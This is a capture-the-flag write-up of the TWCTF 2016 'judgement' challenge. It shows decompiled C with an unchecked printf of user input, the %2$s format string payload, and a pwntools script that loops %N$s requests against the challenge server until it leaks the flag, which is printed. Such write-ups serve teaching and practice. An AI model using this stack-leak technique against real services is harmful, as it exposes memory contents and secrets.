---
title: '[TWCTF-2016: PWN] judgement Writeup'
author: Megabeets
type: posts
date: 2016-09-04T23:54:32+00:00

categories:
  - TWCTF 2016
  - Writeups
tags:
  - CTF
  - PWN
  - TWCTF
  - Writeups

---
Guest post by Shak.

> **Challenge description:**  
> _Host : pwn1.chal.ctf.westerns.tokyo_  
> _Port : 31729_  
> [judgement][1]{.attachment}

* * *

```sh
[Megabeets]$ nc pwn1.chal.ctf.westerns.tokyo 31729
Flag judgment system
Input flag >> FLAG
FLAG
Wrong flag...

```


<span style="font-weight: 400;">Let’s check the binary. The following function is reading the flag from a local file on the server, so this binary will not reveal the flag, but further examining it might.</span>

```c
int __cdecl load_flag(char *filename, char *s, int n)
{
  int result; // eax@2
  FILE *stream; // [sp+18h] [bp-10h]@1
  char *v5; // [sp+1Ch] [bp-Ch]@5

  stream = fopen(filename, "r");
  if ( stream ) {
    if ( fgets(s, n, stream) ) {
      v5 = strchr(s, 10);
      if ( v5 )
        *v5 = 0;
      result = 1;
    }
    else { result = 0;}
  }
  else { result = 0; }
  return result;
}

```


<span style="font-weight: 400;">Next we can see the main function which gets our input and compares it to the flag. </span>

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *v3; // esp@1
  int result; // eax@2
  int v5; // ecx@6
  char input; // [sp+0h] [bp-4Ch]@1
  int v7; // [sp+40h] [bp-Ch]@1
  int *v8; // [sp+48h] [bp-4h]@1

  v8 = &argc;
  v7 = *MK_FP(__GS__, 20);
  v3 = alloca(144);
  printf("Flag judgment system\nInput flag >> ");
  if ( getnline(&input, 64) ) {
    printf(&input);
    if ( !strcmp(&input, flag) )
      result = puts("\nCorrect flag!!");
    else
      result = puts("\nWrong flag...");
  }
  else {
    puts("Unprintable character");
    result = -1;
  }
  v5 = *MK_FP(__GS__, 20) ^ v7;
  return result;
}

```


<span style="font-weight: 400;">What it also does, is printing our input with no formatting (line 15), which means we can use <em>printf</em> format to read data from the stack. First of all, let’s check if this will work by trying to print the second value from the stack as a string</span>

```sh
Flag judgment system
Input flag >> %2$s
פJr≈
Wrong flag…
```


<span style="font-weight: 400;">It works, but no luck there. I wrote a simple python script that will print the first 300 values from the stack and search for the flag:</span>

```python
#!/usr/bin/python

from pwn import *

for i in xrange(1,300):
        r = remote('pwn1.chal.ctf.westerns.tokyo', 31729)
        r.recv()
        r.sendline("%{}$s".format(i))
        try:
                res = r.recv()
                if "TWCTF" in res:
                        print "The flag is: " + res
                        break
        except:
                pass
        r.close()
```


<span style="font-weight: 400;">And indeed we get it:</span>

```sh
[+] Opening connection to pwn1.chal.ctf.westerns.tokyo on port 31729: Done
[*] Closed connection to pwn1.chal.ctf.westerns.tokyo port 31729
[+] Opening connection to pwn1.chal.ctf.westerns.tokyo on port 31729: Done
.
.
.
[+] Opening connection to pwn1.chal.ctf.westerns.tokyo on port 31729: Done
The flag is: TWCTF{R3:l1f3_1n_4_pwn_w0rld_fr0m_z3r0}
Wrong flag...

```




 [1]: https://twctf7qygt6ujk.azureedge.n./judgement-4da7533784aa31b96ca158fbda9677ee8507781ead6625dc6d577fd5d2ff697c